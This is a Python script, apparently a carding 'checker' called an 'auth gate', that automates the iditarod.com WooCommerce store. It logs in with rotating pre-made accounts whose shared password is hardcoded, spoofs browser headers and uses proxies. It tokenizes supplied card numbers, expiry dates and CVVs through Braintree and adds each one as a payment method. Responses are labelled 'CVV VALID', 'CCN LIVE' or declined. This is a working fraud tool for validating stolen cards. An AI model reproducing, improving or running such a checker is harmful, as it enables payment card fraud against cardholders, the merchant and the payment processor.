"""
Iditarod.com Braintree Auth Gate
Login -> payment-methods -> add-payment-method -> Braintree tokenize -> submit.
Rotates through pre-created accounts. Parses real success/decline/error responses.
"""

from __future__ import annotations

import base64
import json
import re
import secrets
import threading
import uuid
from typing import Optional, Tuple

import requests
from bs4 import BeautifulSoup

BASE_URL = "https://iditarod.com"
LOGIN_URL = f"{BASE_URL}/my-account/"
PAYMENT_METHODS_URL = f"{BASE_URL}/my-account/payment-methods/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"
ADMIN_AJAX_URL = f"{BASE_URL}/wp-admin/admin-ajax.php"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"

IDITAROD_PASSWORD = "Mass007@in"
IDITAROD_ACCOUNTS = [
    "zc67o6vz7o@mrotzis.com",
    "sttw95b8qy@lnovic.com",
    "x3pyiucrod@xkxkud.com",
    "8e7cir36hq@illubd.com",
    "w1x3fop3vq@illubd.com",
    "4hdspn6bv8@mrotzis.com",
    "2u2q78yawq@xkxkud.com",
    "c8759pb0cm@mrotzis.com",
    "gy2zr77zxa@daouse.com",
    "9r0qd8ilrw@bwmyga.com",
]

_rotation_lock = threading.Lock()
_rotation_index = 0


def _next_account() -> Tuple[str, str]:
    global _rotation_index
    with _rotation_lock:
        idx = _rotation_index % len(IDITAROD_ACCOUNTS)
        _rotation_index += 1
    email = IDITAROD_ACCOUNTS[idx]
    return email, IDITAROD_PASSWORD


def _getstr(data: str, first: str, last: str) -> Optional[str]:
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end].strip()
    except ValueError:
        return None


def _normalize_proxy(proxy: Optional[str]) -> Optional[dict]:
    if not proxy or not str(proxy).strip():
        return None
    raw = str(proxy).strip()
    if "[" in raw or "]" in raw or raw.count(":") > 4:
        return None
    if not raw.startswith(("http://", "https://")):
        raw = f"http://{raw}"
    if "://" not in raw or len(raw) < 12:
        return None
    return {"http": raw, "https": raw}


def _card_brand(cc: str) -> str:
    n = (cc or "").strip()
    if n.startswith("4"):
        return "visa"
    if n.startswith("5") or n.startswith("2"):
        return "mastercard"
    if n.startswith("3"):
        return "amex"
    if n.startswith("6"):
        return "discover"
    return "visa"


def _default_headers(referer: str = "", origin: str = BASE_URL) -> dict:
    return {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="138", "Google Chrome";v="138", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none" if not referer else "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "referer": referer or BASE_URL + "/",
        "origin": origin,
    }


def _parse_login_nonce(html: str) -> Optional[str]:
    m = re.search(r'name=["\']woocommerce-login-nonce["\']\s+value=["\']([^"\']+)["\']', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']woocommerce-login-nonce["\']', html, re.I)
    if m:
        return m.group(1)
    soup = BeautifulSoup(html, "html.parser")
    inp = soup.find("input", {"name": "woocommerce-login-nonce"})
    return inp.get("value") if inp else None


def _parse_client_token_nonce(html: str) -> Optional[str]:
    m = re.search(r'["\']client_token_nonce["\']\s*:\s*["\']([^"\']+)["\']', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'"client_token_nonce":"([^"]+)"', html)
    if m:
        return m.group(1)
    return _getstr(html, '"client_token_nonce":"', '"')


def _parse_add_payment_nonce(html: str) -> Optional[str]:
    m = re.search(
        r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']',
        html,
        re.I,
    )
    if m:
        return m.group(1)
    m = re.search(
        r'id=["\']woocommerce-add-payment-method-nonce["\'][^>]+value=["\']([^"\']+)["\']',
        html,
        re.I,
    )
    if m:
        return m.group(1)
    soup = BeautifulSoup(html, "html.parser")
    inp = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})
    return inp.get("value") if inp else None


def _parse_woo_errors(html: str) -> list[str]:
    errs = []
    soup = BeautifulSoup(html, "html.parser")
    ul = soup.find("ul", class_=re.compile(r"woocommerce-error", re.I))
    if ul:
        for li in ul.find_all("li"):
            t = (li.get_text() or "").strip()
            if t:
                errs.append(t)
    if not errs:
        m = re.search(r'class=["\']woocommerce-error["\'][^>]*>[\s\S]*?<li[^>]*>([^<]+)', html, re.I)
        if m:
            errs.append(m.group(1).strip())
    return errs


def _map_response_to_status(err_msg: str) -> Tuple[str, str]:
    u = err_msg.upper()
    if any(x in u for x in ("CVV", "CVC", "SECURITY CODE", "VERIFICATION")):
        return "ccn", f"CCN LIVE - {err_msg[:55]}"
    if any(x in u for x in ("DECLINED", "DO NOT HONOR", "NOT AUTHORIZED", "INVALID", "EXPIRED", "LOST", "STOLEN", "PICKUP", "RESTRICTED", "FRAUD", "REVOKED")):
        return "declined", f"Declined: {err_msg[:55]}"
    if any(x in u for x in ("INSUFFICIENT", "LIMIT")):
        return "declined", f"Declined: {err_msg[:55]}"
    if any(x in u for x in ("STATUS CODE 2001", "2001")):
        return "declined", "Declined: Do Not Honor"
    if any(x in u for x in ("STATUS CODE 2002", "2002")):
        return "declined", "Declined: Insufficient Funds"
    if any(x in u for x in ("STATUS CODE 2003", "2003")):
        return "declined", "Declined: Limit Exceeded"
    if any(x in u for x in ("STATUS CODE 2004", "2004")):
        return "ccn", "CCN LIVE - Invalid CVV"
    if any(x in u for x in ("STATUS CODE 2005", "2005")):
        return "declined", "Declined: Invalid Number"
    if any(x in u for x in ("STATUS CODE 2006", "2006")):
        return "declined", "Declined: Expired"
    return "error", err_msg[:60]


def run_iditarod_check(
    card: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy: Optional[str] = None,
) -> dict:
    """
    Full Iditarod Braintree flow: login -> add-payment-method -> tokenize -> submit.
    Returns {status, response} with status in approved|ccn|declined|error.
    Retries with next account on login failure (up to 3 accounts).
    """
    if len(ano) == 4:
        ano = ano[2:]
    if len(mes) == 1:
        mes = f"0{mes}"
    yy = f"20{ano}"
    brand = _card_brand(card)
    proxies = _normalize_proxy(proxy)
    kw: dict = {"timeout": 45, "allow_redirects": True}
    if proxies:
        kw["proxies"] = proxies

    last_error: dict = {"status": "error", "response": "Request failed"}
    max_account_tries = min(3, len(IDITAROD_ACCOUNTS))

    for _ in range(max_account_tries):
        session = requests.Session()
        session.trust_env = False
        session.headers.update(_default_headers())
        try:
            email, password = _next_account()

            r = session.get(LOGIN_URL, **kw)
            if r.status_code != 200:
                last_error = {"status": "error", "response": "Login page failed"}
                continue

            login_nonce = _parse_login_nonce(r.text)
            if not login_nonce:
                last_error = {"status": "error", "response": "Login nonce missing"}
                continue

            login_data = {
                "username": email,
                "password": password,
                "woocommerce-login-nonce": login_nonce,
                "_wp_http_referer": "/my-account/",
                "login": "Log in",
            }
            h = _default_headers(referer=LOGIN_URL, origin=BASE_URL)
            h["content-type"] = "application/x-www-form-urlencoded"
            h["cache-control"] = "max-age=0"
            r = session.post(LOGIN_URL, headers=h, data=login_data, **kw)
            if r.status_code != 200:
                last_error = {"status": "error", "response": "Login request failed"}
                continue

            low = r.text.lower()
            if "logout" not in low and "log out" not in low and "dashboard" not in low:
                errs = _parse_woo_errors(r.text)
                if errs:
                    last_error = {"status": "error", "response": f"Login failed: {errs[0][:50]}"}
                else:
                    last_error = {"status": "error", "response": "Login failed (check account)"}
                continue

            session.get(PAYMENT_METHODS_URL, headers=_default_headers(referer=LOGIN_URL), **kw)

            r = session.get(ADD_PAYMENT_URL, headers=_default_headers(referer=PAYMENT_METHODS_URL), **kw)
            if r.status_code != 200:
                return {"status": "error", "response": "Add payment page failed"}

            client_token_nonce = _parse_client_token_nonce(r.text)
            add_payment_nonce = _parse_add_payment_nonce(r.text)
            if not client_token_nonce or not add_payment_nonce:
                return {"status": "error", "response": "Payment nonces missing"}

            ajax_headers = {
                **_default_headers(referer=ADD_PAYMENT_URL, origin=BASE_URL),
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
            }
            ajax_data = {
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": client_token_nonce,
            }
            r = session.post(ADMIN_AJAX_URL, headers=ajax_headers, data=ajax_data, **kw)
            if r.status_code != 200:
                return {"status": "error", "response": "Client token request failed"}
            try:
                j = r.json()
                client = j.get("data") if isinstance(j, dict) else None
                if not client:
                    return {"status": "error", "response": "No client token"}
                decoded = base64.b64decode(client).decode("utf-8")
                bt = json.loads(decoded)
                auth_fp = bt.get("authorizationFingerprint")
                if not auth_fp:
                    return {"status": "error", "response": "No auth fingerprint"}
            except Exception as e:
                return {"status": "error", "response": f"Token decode error: {str(e)[:30]}"}

            correlation = secrets.token_hex(16)
            tokenize_payload = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": str(uuid.uuid4()),
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { issuingBank countryOfIssuance } } } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": card,
                            "expirationMonth": mes,
                            "expirationYear": yy,
                            "cvv": cvv,
                        },
                        "options": {"validate": False},
                    }
                },
                "operationName": "TokenizeCreditCard",
            }
            bt_headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "authorization": f"Bearer {auth_fp}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "referer": "https://assets.braintreegateway.com/",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "user-agent": session.headers.get("user-agent", "Mozilla/5.0 Chrome/138.0.0.0"),
            }
            r = session.post(BRAINTREE_GRAPHQL, headers=bt_headers, json=tokenize_payload, **kw)
            if r.status_code != 200:
                return {"status": "error", "response": "Tokenize request failed"}
            try:
                j = r.json()
            except Exception:
                return {"status": "error", "response": "Tokenize response not JSON"}

            errs = j.get("errors")
            if errs and isinstance(errs, list):
                err = errs[0] if errs else {}
                msg = err.get("message", "Unknown") if isinstance(err, dict) else str(err)
                st, resp = _map_response_to_status(msg)
                return {"status": st, "response": resp}

            data = j.get("data") or {}
            tt = (data.get("tokenizeCreditCard") or {}).get("token")
            if not tt:
                return {"status": "error", "response": "No token from Braintree"}

            form_headers = {
                **_default_headers(referer=ADD_PAYMENT_URL, origin=BASE_URL),
                "content-type": "application/x-www-form-urlencoded",
                "cache-control": "max-age=0",
            }
            device = json.dumps({"correlation_id": correlation})
            form_data = [
                ("payment_method", "braintree_credit_card"),
                ("wc-braintree-credit-card-card-type", brand),
                ("wc-braintree-credit-card-3d-secure-enabled", ""),
                ("wc-braintree-credit-card-3d-secure-verified", ""),
                ("wc-braintree-credit-card-3d-secure-order-total", "0.00"),
                ("wc-braintree-credit-card-cart-contains-subscription", "0"),
                ("wc_braintree_credit_card_payment_nonce", tt),
                ("wc_braintree_device_data", device),
                ("wc-braintree-credit-card-tokenize-payment-method", "true"),
                ("wc_braintree_paypal_payment_nonce", ""),
                ("wc-braintree-paypal-context", "shortcode"),
                ("wc-braintree-paypal-amount", "0.00"),
                ("wc-braintree-paypal-currency", "USD"),
                ("wc-braintree-paypal-locale", "en_us"),
                ("wc-braintree-paypal-tokenize-payment-method", "true"),
                ("woocommerce-add-payment-method-nonce", add_payment_nonce),
                ("_wp_http_referer", "/my-account/add-payment-method/"),
                ("woocommerce_add_payment_method", "1"),
            ]
            r = session.post(ADD_PAYMENT_URL, headers=form_headers, data=form_data, **kw)
            if r.status_code != 200:
                return {"status": "error", "response": "Add payment submit failed"}

            txt = r.text
            success_phrases = [
                "payment method added",
                "payment method successfully added",
                "new payment method added",
                "nice! new payment method",
            ]
            if any(p in txt.lower() for p in success_phrases):
                cc_info = (data.get("tokenizeCreditCard") or {}).get("creditCard") or {}
                bd = cc_info.get("binData") or {}
                bank = (bd.get("issuingBank") or "N/A")[:25]
                br = cc_info.get("brandCode") or "N/A"
                return {"status": "approved", "response": f"CVV VALID ✓ | {br} | Bank: {bank}"}

            errs = _parse_woo_errors(txt)
            if errs:
                raw = " ".join(errs)
                st, resp = _map_response_to_status(raw)
                return {"status": st, "response": resp}

            if "woocommerce-error" in txt.lower():
                return {"status": "error", "response": "Card declined (no message)"}

            return {"status": "declined", "response": "Declined (no success message)"}

        except requests.exceptions.Timeout:
            last_error = {"status": "error", "response": "Request Timeout"}
        except requests.exceptions.ConnectionError:
            last_error = {"status": "error", "response": "Connection Error"}
        except requests.exceptions.ProxyError:
            last_error = {"status": "error", "response": "Proxy Error"}
        except Exception as e:
            last_error = {"status": "error", "response": f"Error: {str(e)[:50]}"}
        finally:
            try:
                session.close()
            except Exception:
                pass

    return last_error
